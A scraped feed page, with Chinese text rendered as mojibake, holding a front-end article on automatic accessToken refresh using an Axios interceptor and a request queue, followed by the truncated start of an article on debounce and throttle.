<p>åœ¨å‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ä¸­ï¼Œå‰ç«¯é€šå¸¸é€šè¿‡ <code>accessToken</code> æ¥è®¿é—®ä¸šåŠ¡æ¥å£ã€‚ ä½†ç”±äº <code>accessToken</code> æœ‰æœ‰æ•ˆæœŸé™åˆ¶ï¼Œè¿‡æœŸåçš„å¤„ç†æ–¹å¼ï¼Œç›´æ¥å½±å“ç³»ç»Ÿçš„<strong>å®‰å…¨æ€§</strong>å’Œ<strong>ç”¨æˆ·ä½“éªŒ</strong>ã€‚</p>
<p>æœ¬æ–‡å°†ä»‹ç»ä¸€ç§ <strong>åŸºäº Axios å“åº”æ‹¦æˆªå™¨ + è¯·æ±‚é˜Ÿåˆ—</strong> çš„ Token è‡ªåŠ¨åˆ·æ–°æ–¹æ¡ˆï¼Œé€‚ç”¨äºå®é™…ç”Ÿäº§ç¯å¢ƒã€‚</p>
<h2 data-id="heading-1">äºŒã€æ•´ä½“è®¾è®¡æ€è·¯</h2>
<p>æ ¸å¿ƒç›®æ ‡åªæœ‰ä¸‰ä¸ªï¼š</p>
<ol>
<li><strong>accessToken è¿‡æœŸæ—¶è‡ªåŠ¨åˆ·æ–°</strong></li>
<li><strong>refreshToken åªè¯·æ±‚ä¸€æ¬¡</strong></li>
<li><strong>åˆ·æ–°å®Œæˆåè‡ªåŠ¨é‡è¯•è¿‡æœŸå‰çš„è¯·æ±‚</strong></li>
</ol>
<p>æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ead6923e989450e992aff5068cd7470~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW50b2luZUdyaWV6bWFubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942001&amp;x-signature=DhI3WleSxmSUhPi%2FFbooODJ7BgA%3D" alt="token_FlowChart.png" width="70%" loading="lazy"/>
<h2 data-id="heading-2">ä¸‰ã€åŸºäºä¸šåŠ¡ code çš„ç»Ÿä¸€é”™è¯¯æŠ›å‡º</h2>
<p>é¡¹ç›®ä¸­åç«¯è¿”å›ç»Ÿä¸€çš„æ•°æ®ç»“æ„ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
  <span class="hljs-selector-tag">code</span>:number;
  msg:string;
  data:any
}
</code></pre>
<p>åœ¨ Axios çš„å“åº”æ‹¦æˆªå™¨çš„ <strong>æˆåŠŸå›è°ƒ</strong> ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (code === <span class="hljs-title class_">ApiCodeEnum</span>.<span class="hljs-property">SUCCESS</span>) {
 Â <span class="hljs-keyword">return</span> data;
}
â€‹
<span class="hljs-comment">// ä¸šåŠ¡é”™è¯¯ï¼Œä¸»åŠ¨æŠ›å‡º</span>
<span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(msg || <span class="hljs-string">"ç³»ç»Ÿå‡ºé”™"</span>);
<span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(msg || <span class="hljs-string">"Error"</span>));
</code></pre>
<ul>
<li>æˆåŠŸæµåªå¤„ç† <strong>çœŸæ­£æˆåŠŸçš„æ•°æ®</strong></li>
<li>æ‰€æœ‰ä¸šåŠ¡å¼‚å¸¸ <strong>ç»Ÿä¸€è¿›å…¥ error åˆ†æ”¯</strong></li>
<li>åç»­é€»è¾‘æ›´æ¸…æ™°ã€é›†ä¸­</li>
</ul>
<h2 data-id="heading-3">å››ã€åœ¨ error åˆ†æ”¯ä¸­ç»Ÿä¸€å¤„ç† Token å¼‚å¸¸</h2>
<p>åœ¨ Axios å“åº”æ‹¦æˆªå™¨çš„ error å›è°ƒä¸­ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">async</span> (<span class="hljs-keyword">error</span>) =&gt; {
 Â <span class="hljs-keyword">const</span> { response, config } = <span class="hljs-keyword">error</span>;
â€‹
 Â <span class="hljs-keyword">if</span> (!response) {
 Â  Â ElMessage.<span class="hljs-keyword">error</span>(<span class="hljs-string">"ç½‘ç»œè¿æ¥å¤±è´¥"</span>);
 Â  Â <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-keyword">error</span>);
  }
â€‹
 Â <span class="hljs-keyword">const</span> { code, msg } = response.data;
â€‹
 Â switch (code) {
 Â  Â <span class="hljs-keyword">case</span> ApiCodeEnum.ACCESS_TOKEN_INVALID:
 Â  Â  Â <span class="hljs-keyword">return</span> refreshTokenAndRetry(config, service);
â€‹
 Â  Â <span class="hljs-keyword">case</span> ApiCodeEnum.REFRESH_TOKEN_INVALID:
 Â  Â  Â <span class="hljs-built_in">await</span> redirectToLogin(<span class="hljs-string">"ç™»å½•å·²è¿‡æœŸ"</span>);
 Â  Â  Â <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-keyword">error</span>);
â€‹
 Â  Â <span class="hljs-keyword">default</span>:
 Â  Â  Â ElMessage.<span class="hljs-keyword">error</span>(msg || <span class="hljs-string">"ç³»ç»Ÿå‡ºé”™"</span>);
 Â  Â  Â <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-keyword">error</span>);
  }
};
</code></pre>
<h3 data-id="heading-4">è®¾è®¡è¦ç‚¹</h3>
<ul>
<li><strong>åªåœ¨ä¸€ä¸ªåœ°æ–¹åˆ¤æ–­ Token å¤±æ•ˆ</strong></li>
<li>ä¸åœ¨ä¸šåŠ¡ä»£ç ä¸­å…³å¿ƒ Token çŠ¶æ€</li>
</ul>
<h2 data-id="heading-5">äº”ã€Token åˆ·æ–°çš„éš¾ç‚¹ï¼šå¹¶å‘è¯·æ±‚é—®é¢˜</h2>
<p>å¦‚æœå¤šä¸ªæ¥å£åŒæ—¶è¿”å› <code>ACCESS_TOKEN_INVALID</code>ï¼š</p>
<ul>
<li>âŒ ä¼šè§¦å‘å¤šæ¬¡ refreshToken è¯·æ±‚</li>
<li>âŒ åç«¯å‹åŠ›å¤§</li>
<li>âŒ Token çŠ¶æ€æ··ä¹±</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šè¯·æ±‚é˜Ÿåˆ— + åˆ·æ–°é”</strong></p>
<h2 data-id="heading-6">å…­ã€åŸºäºé—­åŒ…çš„ Token åˆ·æ–°é˜Ÿåˆ—å®ç°</h2>
<p>é€šè¿‡ç»„åˆå¼å‡½æ•° <code>useTokenRefresh</code> å®ç°ï¼š</p>
<h3 data-id="heading-7">æ ¸å¿ƒçŠ¶æ€</h3>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">isRefreshingToken</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
const <span class="hljs-attr">pendingRequests</span> = []<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-8">åˆ·æ–° Token å¹¶é‡è¯•è¯·æ±‚</h3>
<pre><code class="hljs language-ini" lang="ini">async function refreshTokenAndRetry(config, httpRequest) {
 Â return new Promise((resolve, reject) =&gt; {
 Â  Â const <span class="hljs-attr">retryRequest</span> = () =&gt; {
 Â  Â  Â const <span class="hljs-attr">newToken</span> = AuthStorage.getAccessToken()<span class="hljs-comment">;</span>
 Â  Â  Â <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${newToken}</span>`<span class="hljs-comment">;</span>
 Â  Â  Â httpRequest(config).then(resolve).catch(reject)<span class="hljs-comment">;</span>
 Â   }<span class="hljs-comment">;</span>
â€‹
 Â  Â pendingRequests.push({ resolve, reject, retryRequest })<span class="hljs-comment">;</span>
â€‹
 Â  Â if (!isRefreshingToken) {
 Â  Â  Â <span class="hljs-attr">isRefreshingToken</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
â€‹
 Â  Â  Â useUserStoreHook()
 Â  Â  Â   .refreshToken()
 Â  Â  Â   .then(() =&gt; {
 Â  Â  Â  Â  Â pendingRequests.forEach(<span class="hljs-attr">req</span> =&gt; req.retryRequest())<span class="hljs-comment">;</span>
 Â  Â  Â  Â  Â <span class="hljs-attr">pendingRequests.length</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
 Â  Â  Â   })
 Â  Â  Â   .catch(async () =&gt; {
 Â  Â  Â  Â  Â pendingRequests.forEach(<span class="hljs-attr">req</span> =&gt;
 Â  Â  Â  Â  Â  Â req.reject(new Error("Token refresh failed"))
 Â  Â  Â  Â   )<span class="hljs-comment">;</span>
 Â  Â  Â  Â  Â <span class="hljs-attr">pendingRequests.length</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
 Â  Â  Â  Â  Â await redirectToLogin("ç™»å½•å·²å¤±æ•ˆ")<span class="hljs-comment">;</span>
 Â  Â  Â   })
 Â  Â  Â   .finally(() =&gt; {
 Â  Â  Â  Â  Â <span class="hljs-attr">isRefreshingToken</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
 Â  Â  Â   })<span class="hljs-comment">;</span>
 Â   }
  })<span class="hljs-comment">;</span>
}
</code></pre>
<h2 data-id="heading-9">ä¸ƒã€ä¸ºä»€ä¹ˆè¦æå‰åˆå§‹åŒ–åˆ·æ–°å‡½æ•°ï¼Ÿ</h2>
<blockquote>
<p>åœ¨åˆ›å»º Axios å‡½æ•°ä¸­è¦æå‰åˆå§‹åŒ–åˆ·æ–°å‡½æ•°</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss">const { refreshTokenAndRetry } = <span class="hljs-built_in">useTokenRefresh</span>();
</code></pre>
<h3 data-id="heading-10">åŸå› </h3>
<ul>
<li>
<p>åˆ©ç”¨ <strong>é—­åŒ…</strong> ä¿å­˜åˆ·æ–°çŠ¶æ€</p>
</li>
<li>
<p>ç¡®ä¿æ‰€æœ‰è¯·æ±‚å…±äº«ï¼š</p>
<ul>
<li><code>isRefreshingToken</code></li>
<li><code>pendingRequests</code></li>
</ul>
</li>
<li>
<p>é˜²æ­¢é‡å¤åˆ·æ–°</p>
</li>
</ul>
<h2 data-id="heading-11">å®Œæ•´ä»£ç ç¤ºä¾‹</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">InternalAxiosRequestConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"axios"</span>;
<span class="hljs-keyword">import</span> { useUserStoreHook } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/store/modules/user.store"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AuthStorage</span>, redirectToLogin } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils/auth"</span>;
â€‹
<span class="hljs-comment">/**
 * ç­‰å¾…è¯·æ±‚çš„ç±»å‹æ¥å£
 */</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PendingRequest</span> = {
 Â <span class="hljs-attr">resolve</span>: <span class="hljs-function">(<span class="hljs-params">_value: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
 Â <span class="hljs-attr">reject</span>: <span class="hljs-function">(<span class="hljs-params">_reason?: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
 Â <span class="hljs-attr">retryRequest</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
};
â€‹
<span class="hljs-comment">/**
 * Tokenåˆ·æ–°ç»„åˆå¼å‡½æ•°
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useTokenRefresh</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-comment">// Token åˆ·æ–°ç›¸å…³çŠ¶æ€s</span>
 Â <span class="hljs-keyword">let</span> isRefreshingToken = <span class="hljs-literal">false</span>;
 Â <span class="hljs-keyword">const</span> <span class="hljs-attr">pendingRequests</span>: <span class="hljs-title class_">PendingRequest</span>[] = [];
â€‹
 Â <span class="hljs-comment">/**
 Â  * åˆ·æ–° Token å¹¶é‡è¯•è¯·æ±‚
 Â  */</span>
 Â <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">refreshTokenAndRetry</span>(<span class="hljs-params">
 Â  Â config: InternalAxiosRequestConfig,
 Â  Â httpRequest: <span class="hljs-built_in">any</span>
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; {
 Â  Â <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
 Â  Â  Â <span class="hljs-comment">// å°è£…éœ€è¦é‡è¯•çš„è¯·æ±‚</span>
 Â  Â  Â <span class="hljs-keyword">const</span> <span class="hljs-title function_">retryRequest</span> = (<span class="hljs-params"/>) =&gt; {
 Â  Â  Â  Â <span class="hljs-keyword">const</span> newToken = <span class="hljs-title class_">AuthStorage</span>.<span class="hljs-title function_">getAccessToken</span>();
 Â  Â  Â  Â <span class="hljs-keyword">if</span> (newToken &amp;&amp; config.<span class="hljs-property">headers</span>) {
 Â  Â  Â  Â  Â config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${newToken}</span>`</span>;
 Â  Â  Â   }
 Â  Â  Â  Â <span class="hljs-title function_">httpRequest</span>(config).<span class="hljs-title function_">then</span>(resolve).<span class="hljs-title function_">catch</span>(reject);
 Â  Â   };
â€‹
 Â  Â  Â <span class="hljs-comment">// å°†è¯·æ±‚åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</span>
 Â  Â  Â pendingRequests.<span class="hljs-title function_">push</span>({ resolve, reject, retryRequest });
â€‹
 Â  Â  Â <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ­£åœ¨åˆ·æ–°ï¼Œåˆ™å¼€å§‹åˆ·æ–°æµç¨‹</span>
 Â  Â  Â <span class="hljs-keyword">if</span> (!isRefreshingToken) {
 Â  Â  Â  Â isRefreshingToken = <span class="hljs-literal">true</span>;
â€‹
 Â  Â  Â  Â <span class="hljs-title function_">useUserStoreHook</span>()
 Â  Â  Â  Â   .<span class="hljs-title function_">refreshToken</span>()
 Â  Â  Â  Â   .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
 Â  Â  Â  Â  Â  Â <span class="hljs-comment">// åˆ·æ–°æˆåŠŸï¼Œé‡è¯•æ‰€æœ‰ç­‰å¾…çš„è¯·æ±‚</span>
 Â  Â  Â  Â  Â  Â pendingRequests.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">request</span>) =&gt;</span> {
 Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">try</span> {
 Â  Â  Â  Â  Â  Â  Â  Â request.<span class="hljs-title function_">retryRequest</span>();
 Â  Â  Â  Â  Â  Â   } <span class="hljs-keyword">catch</span> (error) {
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Retry request error:"</span>, error);
 Â  Â  Â  Â  Â  Â  Â  Â request.<span class="hljs-title function_">reject</span>(error);
 Â  Â  Â  Â  Â  Â   }
 Â  Â  Â  Â  Â   });
 Â  Â  Â  Â  Â  Â <span class="hljs-comment">// æ¸…ç©ºé˜Ÿåˆ—</span>
 Â  Â  Â  Â  Â  Â pendingRequests.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
 Â  Â  Â  Â   })
 Â  Â  Â  Â   .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">async</span> (error) =&gt; {
 Â  Â  Â  Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Token refresh failed:"</span>, error);
 Â  Â  Â  Â  Â  Â <span class="hljs-comment">// åˆ·æ–°å¤±è´¥ï¼Œå…ˆ reject æ‰€æœ‰ç­‰å¾…çš„è¯·æ±‚ï¼Œå†æ¸…ç©ºé˜Ÿåˆ—</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">const</span> failedRequests = [...pendingRequests];
 Â  Â  Â  Â  Â  Â pendingRequests.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
â€‹
 Â  Â  Â  Â  Â  Â <span class="hljs-comment">// æ‹’ç»æ‰€æœ‰ç­‰å¾…çš„è¯·æ±‚</span>
 Â  Â  Â  Â  Â  Â failedRequests.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">request</span>) =&gt;</span> {
 Â  Â  Â  Â  Â  Â  Â request.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Token refresh failed"</span>));
 Â  Â  Â  Â  Â   });
â€‹
 Â  Â  Â  Â  Â  Â <span class="hljs-comment">// è·³è½¬ç™»å½•é¡µ</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">await</span> <span class="hljs-title function_">redirectToLogin</span>(<span class="hljs-string">"ç™»å½•çŠ¶æ€å·²å¤±æ•ˆï¼Œè¯·é‡æ–°ç™»å½•"</span>);
 Â  Â  Â  Â   })
 Â  Â  Â  Â   .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
 Â  Â  Â  Â  Â  Â isRefreshingToken = <span class="hljs-literal">false</span>;
 Â  Â  Â  Â   });
 Â  Â   }
 Â   });
  }
â€‹
 Â <span class="hljs-keyword">return</span> {
 Â  Â refreshTokenAndRetry,
  };
}
â€‹
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»å®šæ—¶å™¨ç®¡ç†å‡ºå‘ï¼Œå½»åº•ææ‡‚é˜²æŠ–ä¸èŠ‚æµçš„å®ç°é€»è¾‘]]></title>    <link>https://juejin.cn/post/7590071125398192168</link>    <guid>https://juejin.cn/post/7590071125398192168</guid>    <pubDate>2026-01-02T07:01:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398192168" data-draft-id="7589978645135753226" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»å®šæ—¶å™¨ç®¡ç†å‡ºå‘ï¼Œå½»åº•ææ‡‚é˜²æŠ–ä¸èŠ‚æµçš„å®ç°é€»è¾‘"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-02T07:01:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çƒŸè¢…ç ´è¾°"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»å®šæ—¶å™¨ç®¡ç†å‡ºå‘ï¼Œå½»åº•ææ‡‚é˜²æŠ–ä¸èŠ‚æµçš„å®ç°é€»è¾‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çƒŸè¢…ç ´è¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:01:17.000Z" title="Fri Jan 02 2026 07:01:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œé«˜é¢‘äº‹ä»¶ï¼ˆå¦‚è¾“å…¥ã€æ»šåŠ¨ã€çª—å£ç¼©æ”¾ï¼‰è‹¥ä¸åŠ æ§åˆ¶ï¼Œææ˜“å¼•å‘æ€§èƒ½é—®é¢˜ã€‚ä¸ºåº”å¯¹è¿™ä¸€æŒ‘æˆ˜ï¼Œ<strong>é˜²æŠ–ï¼ˆdebounceï¼‰</strong> ä¸ <strong>èŠ‚æµï¼ˆthrottleï¼‰</strong> æˆä¸ºå¿…å¤‡å·¥å…·ã€‚</p>
<hr/>
<h3 data-id="heading-0">ä¸€ã€é˜²æŠ–ï¼šæ¯æ¬¡è§¦å‘éƒ½é‡ç½®å®šæ—¶å™¨</h3>
<p>å‡è®¾æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªåŠŸèƒ½ï¼šç”¨æˆ·åœ¨è¾“å…¥æ¡†æ‰“å­—æ—¶ï¼Œåªæœ‰å½“ä»–åœæ­¢è¾“å…¥è¶…è¿‡ 1 ç§’ï¼Œæ‰å‘é€è¯·æ±‚ã€‚</p>
<h4 data-id="heading-1">ç¬¬ä¸€æ­¥ï¼šæˆ‘éœ€è¦å»¶è¿Ÿæ‰§è¡Œ</h4>
<p>æ˜¾ç„¶ï¼Œè¦ç”¨ <code>setTimeout</code>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">setTimeout</span>(() =&gt; {
    <span class="hljs-built_in">ajax</span>(value);
}, <span class="hljs-number">1000</span>);
</code></pre>
<h4 data-id="heading-2">ç¬¬äºŒæ­¥ï¼šä½†å¦‚æœç”¨æˆ·ç»§ç»­è¾“å…¥ï¼Œä¹‹å‰çš„è¯·æ±‚å°±ä¸è¯¥å‘</h4>
<p>â†’ æ‰€ä»¥å¿…é¡»<strong>å–æ¶ˆä¹‹å‰çš„å®šæ—¶å™¨</strong>ï¼Œå†å»ºä¸€ä¸ªæ–°çš„ã€‚</p>
<p>è¿™å°±è¦æ±‚æˆ‘ä»¬<strong>ä¿å­˜å®šæ—¶å™¨ ID</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">let timerId;
<span class="hljs-comment">// æ¯æ¬¡è§¦å‘æ—¶ï¼š</span>
if (timerId) <span class="hljs-built_in">clearTimeout</span>(timerId);
timerId = <span class="hljs-built_in">setTimeout</span>(() =&gt; {
    <span class="hljs-built_in">ajax</span>(value);
}, <span class="hljs-number">1000</span>);
</code></pre>
<h4 data-id="heading-3">ç¬¬ä¸‰æ­¥ï¼šå¤„ç† <code>this</code> å’Œå‚æ•°</h4>
<p>å› ä¸º <code>ajax</code> å¯èƒ½ä¾èµ–ä¸Šä¸‹æ–‡æˆ–å¤šä¸ªå‚æ•°ï¼Œä¸èƒ½ç›´æ¥å†™æ­»ã€‚æˆ‘ä»¬éœ€è¦åœ¨è§¦å‘æ—¶æ•è·å½“å‰çš„ <code>this</code> å’Œ <code>arguments</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, delay</span>) {
    <span class="hljs-keyword">let</span> timerId;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
        <span class="hljs-keyword">const</span> context = <span class="hljs-variable language_">this</span>;
        <span class="hljs-keyword">if</span> (timerId) <span class="hljs-built_in">clearTimeout</span>(timerId);
        timerId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            fn.<span class="hljs-title function_">apply</span>(context, args);
        }, delay);
    };
}
</code></pre>
<blockquote>
<p>åˆ°æ­¤ï¼Œé˜²æŠ–å®Œæˆã€‚å®ƒçš„å…¨éƒ¨é€»è¾‘å°±æºäºä¸€å¥è¯ï¼š <strong>â€œæ¯æ¬¡è§¦å‘ï¼Œå…ˆåˆ æ—§å®šæ—¶å™¨ï¼Œå†å»ºæ–°å®šæ—¶å™¨ã€‚â€</strong><br/>
